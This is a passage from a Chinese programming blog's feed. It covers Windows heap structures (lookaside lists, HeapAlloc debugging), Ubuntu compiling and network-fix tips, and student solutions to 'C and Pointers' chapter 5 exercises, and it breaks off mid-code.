assigned</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h1);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h2);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h4);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong></p><p>​使用快表后，堆结构会发生变化，最主要的变化是 “尾块” 不在位于堆 0x0688 偏移处了，这个位置被快表霸占。</p></blockquote><h4 id="调试-2"><a class="markdownIt-Anchor" href="#调试-2"></a> 调试</h4><p>我们先来看看空表索引区发生了哪些变化，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134129670-165052216419926.png" alt="image-空表索引区"><br>可以看到，在<code>0x003a0178</code>处变为了<code>003a1ee8</code>，不再是<code>0x003a0688</code></p><p>现在我们来看看快表（<code>0x003a0688</code>），在偏移 <code>ox0688</code>处，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134256430-165052216419927.png" alt="image-快表"><br>可以看到，堆刚初始化，快表是空的</p><p>然后我们将将代码调试到，释放完 h4之后，如下图所示<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134354214-165052216419928.png" alt="image-代码"></p><p>根据四个堆块大小我们可以知道，h1,h2 将会被插入到 Lookaside[1]中，h3 会被插入到 Lookaside[2]中，h4会被插入到 Lookaside[4]中，快表区状态，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410134512823-165052216419929.png" alt="image-快表"><br>可以看到，<code>003a1ea0</code>是 8字节堆块地址，<code>003a1eb0</code>是16字节堆地址，<code>003a1ec8</code>是24字节堆地址</p><p>进入<code>003a1ea0</code>，来看看堆块状态，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410135353770-165052216419930.png" alt="image-003a1ea0"><br>紫色框的为下一堆块指针，红色框为堆块状态，<code>ox01</code>表示是 Busy 状态<br>块首只存指向下一堆块的指针，不存再指向前一堆块的指针。</p><p>接着申请 16 字节的空间，系统会从 Lookaside[2]中卸载一个堆块分配给程序，同时修改 Lookaside[2] 表头，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410140303715-165052216419931.png" alt="image-lookaside[2]"></p><p>可以看到，Lookaside[2]（<code>0x003a0718</code>)处变为空了。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><ul><li>堆的数据结构： <code>堆块</code>、<code>堆表</code></li><li>堆块：包含<code>块首</code>、<code>块身</code></li><li><code>堆表</code>：<code>空闲双向链表（freelist）</code>、<code>快速单向链表(lookaside)</code></li><li>占用态的堆块：<code>8字节的块首+块身</code></li><li>空闲态的堆块：<code>16字节的块首（多了flink与blink）+块身</code>。空闲态的堆块变为占用态时，flink与blink所在的空间将变为data区。</li></ul><hr><blockquote><p>参考：</p><ul><li><p>《0day,软件安全漏洞分析技术》</p></li><li><p><a href="https://www.cnblogs.com/Hslim/p/15530690.html#14-%E6%80%BB%E7%BB%93">《深入分析 win32 堆结构与管理策略》</a></p></li></ul></blockquote><hr><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>“杂乱” 是指堆区经过反复的申请、释放操作之后，原本大片连续的空闲内存区可能 呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>“辨别” 是指堆管理程序必须能够正确地识别哪些内存区域是正在被程序使用的占用块，哪些区域是可以返回给当前请求的空闲块。 <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>“恰当” 是指堆管理程序必须能够比较“经济”地分配空闲内存块。如果用户申请使用 8 个字节，而返回给用户一片 512 字节的连续内存区域并将其标记成占用状态，这将造成大量的内存浪费，以致出现明明有内存却无法满足申请请求的情况。 <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>”占用态” 是指已经被分配给用户程序的内存 <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>“空闲态” 是指未被分配给用户程序的内存 <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>&quot;次优分配“ 发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。 <a href="#fnref6" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PS：如果您熟悉堆的工作原理，建议您跳过堆的介绍部分，直接看堆溢出原理&lt;/p&gt;
&lt;h1 id=&quot;堆的工作原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#堆的工作原理&quot;&gt;&lt;/a&gt; 堆的工作原理&lt;/h1&gt;
&lt;h2 id=&quot;堆与栈的区别&quot;&gt;&lt;a c</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="堆" scheme="https://www.rgzzplus.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu命令行编C语言</title>
    <link href="https://www.rgzzplus.com/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/"/>
    <id>https://www.rgzzplus.com/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/</id>
    <published>2022-03-29T14:58:54.000Z</published>
    <updated>2022-03-29T15:14:04.187Z</updated>
    
    <content type="html"><![CDATA[<p>首先在文本编辑器中编写C代码，并将名字保存为hello.c</p><p><img src="/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/image-20220329230050502.png" alt="hello.c"></p><p>在<code>terminal</code>中打开<code>Documents</code>（因为我的hello.c保存在Documents中）</p><p><code>terminal</code>中输入：<code>cc hello.c</code> 编译hello.c</p><p>执行文件 ：<code>./a.out</code> （在Documents中生成可执行文件，同时也会输出)</p><p><img src="/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/image-20220329231023881.png" alt="terminal"></p><p><a href="https://blog.csdn.net/lanyandong/article/details/80670870">详情链接</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先在文本编辑器中编写C代码，并将名字保存为hello.c&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/29/ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96C%E8%AF%AD%E8%A8%80/image-2022032923</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="ubuntu" scheme="https://www.rgzzplus.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu 20.04突然无法联网</title>
    <link href="https://www.rgzzplus.com/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/"/>
    <id>https://www.rgzzplus.com/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/</id>
    <published>2022-03-29T14:53:05.000Z</published>
    <updated>2022-03-29T14:57:06.567Z</updated>
    
    <content type="html"><![CDATA[<p>解决方法：</p><p>在 <code>terminal</code> 下执行如下指令：</p><p>ping <a href="http://www.baidu.com">www.baidu.com</a><br>sudo service network-manager stop<br>sudo rm /var/lib/NetworkManager/NetworkManager.state<br>sudo service network-manager start</p><p>ping <a href="http://www.baidu.com">www.baidu.com</a></p><p>之后显示下图表示连接成功。按 <code>Ctrl+C</code> 即可停止。</p><p><img src="/2022/03/29/ubuntu-20-04%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/image-20220329225535100.png" alt="ping后"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;解决方法：&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;terminal&lt;/code&gt; 下执行如下指令：&lt;/p&gt;
&lt;p&gt;ping &lt;a href=&quot;http://www.baidu.com&quot;&gt;www.baidu.com&lt;/a&gt;&lt;br&gt;
sudo service network-manag</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="ubuntu" scheme="https://www.rgzzplus.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu虚拟机磁盘拓展</title>
    <link href="https://www.rgzzplus.com/2022/03/29/ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/"/>
    <id>https://www.rgzzplus.com/2022/03/29/ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/</id>
    <published>2022-03-29T14:34:19.000Z</published>
    <updated>2022-03-29T14:40:31.841Z</updated>
    
    <content type="html"><![CDATA[<p>今天，我在 VMware 上使用 ubuntu 虚拟机时碰到了一个很棘手的问题—磁盘空间不够用了，我想很多使用 ubuntu 的小伙伴或多或少都会碰到这种情况。</p><p>然而，我搜遍了 CSDN 和百度却没有找到答案，让我很是苦恼，最终还是在B站上发现了大佬的视频，帮我解决了磁盘拓展问题。感谢<a href="https://space.bilibili.com/24100898">迪迪亚与前端与Linux</a>大佬。</p><p><a href="https://www.bilibili.com/video/BV1vv411e7kp?p=1">磁盘拓展视频链接</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天，我在 VMware 上使用 ubuntu 虚拟机时碰到了一个很棘手的问题—磁盘空间不够用了，我想很多使用 ubuntu 的小伙伴或多或少都会碰到这种情况。&lt;/p&gt;
&lt;p&gt;然而，我搜遍了 CSDN 和百度却没有找到答案，让我很是苦恼，最终还是在B站上发现了大佬的视频，帮</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="ubuntu" scheme="https://www.rgzzplus.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>C和指针编程题--第五章</title>
    <link href="https://www.rgzzplus.com/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <id>https://www.rgzzplus.com/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/</id>
    <published>2022-03-26T11:33:07.000Z</published>
    <updated>2022-03-26T11:13:53.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第五章编程题59"><a class="markdownIt-Anchor" href="#第五章编程题59"></a> 第五章—编程题5.9</h1><h2 id="题目1"><a class="markdownIt-Anchor" href="#题目1"></a> 题目1</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322202903197.png" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：输出字符串大写形式</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：有两种方案：</span></span><br><span class="line"><span class="comment">*1.将标准输入复制到标准输出中，然后在转换大写，</span></span><br><span class="line"><span class="comment">*但是，它只能在使用ASCII码的机器上运行</span></span><br><span class="line"><span class="comment">*2.使用tolower函数</span></span><br><span class="line"><span class="comment">* 总结：</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 将标准输入复制到标准输出中，将所有大写字母转换为小写字母。</span></span><br><span class="line"><span class="comment">* 如果参数并非大写字母，tolower 函数将不修改，直接返回它的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 方法2：</span></span><br><span class="line"><span class="comment">int main(int argc, char *argv[])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">int ch;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">while( (ch = getchar()) != EOF )</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">putchar( tolower( ch ) );</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法1：</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ch;</span><br><span class="line"><span class="keyword">while</span>( (ch = getchar() ) != EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">ch += <span class="string">&#x27;a&#x27;</span> - <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="built_in">putchar</span>( ch );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目2"><a class="markdownIt-Anchor" href="#题目2"></a> 题目2</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203009335.png" alt="2"></p><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203028563.png" alt="2-1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：加密字母</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：字符实际上是较小的整形值，</span></span><br><span class="line"><span class="comment">*加密实际上是改变这个整型值</span></span><br><span class="line"><span class="comment">* 总结：</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( (ch = getchar()) != EOF )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;a&#x27;</span>&lt;=ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;m&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch+<span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;m&#x27;</span>&lt;ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;z&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch-<span class="string">&#x27;m&#x27;</span>+<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;A&#x27;</span>&lt;=ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;M&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch+<span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;M&#x27;</span>&lt;ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;Z&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch-<span class="string">&#x27;M&#x27;</span>+<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目3"><a class="markdownIt-Anchor" href="#题目3"></a> 题目3</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203143954.png" alt="3"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：变换二进制</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：可以设立一个临时值，保存左移位的值</span></span><br><span class="line"><span class="comment">*然后将右移位的值放在原变量中，然后把它们相加</span></span><br><span class="line"><span class="comment">* 总结：通过移位和+，来变换它的前后值</span></span><br><span class="line"><span class="comment">* 改进：打印二进制</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">reverse_bits</span><span class="params">( <span class="type">unsigned</span> <span class="type">int</span> value )</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_bits</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> value = <span class="number">25</span>;</span><br><span class="line">value=reverse_bits(value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,value);</span><br><span class="line">print_bits(value);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">reverse_bits</span><span class="params">( <span class="type">unsigned</span> <span class="type">int</span> value )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> answer;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">answer = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 只要i不是0就继续进行。这就使得循环与机器的字长无关，</span></span><br><span class="line"><span class="comment">* 从而避免了可移植性问题</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">for</span>( i = <span class="number">1</span>; i != <span class="number">0</span>; i &lt;&lt;= <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 把旧的answer左移1位，位下一个位留下空间</span></span><br><span class="line"><span class="comment">* 如果value的最后一位是1，answer就与1进行OR操作</span></span><br><span class="line"><span class="comment">* 然后将value右移至下一位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">answer = answer &lt;&lt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>( value &amp; <span class="number">1</span> )</span><br><span class="line">answer = answer | <span class="number">1</span>;</span><br><span class="line">value = value &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将value二进制形式打印出来</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_bits</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> len = <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) * <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="type">int</span> bit;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(idx = <span class="number">1</span>; idx &lt;= len; idx++)&#123;</span><br><span class="line"><span class="comment">//从左往右，通过位偏移后，和1取与运算，打印bit位的值</span></span><br><span class="line">bit = <span class="number">1</span> &amp; (value &gt;&gt; (len - idx));</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, bit);</span><br><span class="line"><span class="comment">//四位一空，方便阅读</span></span><br><span class="line"><span class="keyword">if</span>(idx % <span class="number">4</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目4"><a class="markdownIt-Anchor" href="#题目4"></a> 题目4</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203218456.png" alt="4"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：位数组</span></span><br><span class="line"><span class="comment">* 时间：2022/3/23</span></span><br><span class="line"><span class="comment">* 分析：</span></span><br><span class="line"><span class="comment">* 总结：字符&#x27;1&#x27;,&#x27;0&#x27;无法打印，所以是方框</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span 